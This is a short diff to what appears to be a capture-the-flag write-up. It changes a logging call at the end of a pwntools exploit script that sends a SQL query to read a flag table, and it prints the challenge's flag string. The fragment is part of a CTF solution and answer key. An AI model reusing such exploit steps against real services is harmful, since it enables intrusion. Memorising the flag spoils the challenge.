@@ -68,7 +68,7 @@ p.sendline(b"SELECT * FROM flag;")
 p.recvuntil(b"Failed to bind text: column index out of range\n")
 
 flag = p.recvline().decode()
-log.info("Got flag: " + flag)
+log.success("Got flag: " + flag)
 ```
 
 Running the exploit on remote yields the following flag: `HCSC24{h0pe_y0u_u53d_the_str1nG_1n_pR3qu3l_4nd_n0t_b0ring_r34d}`
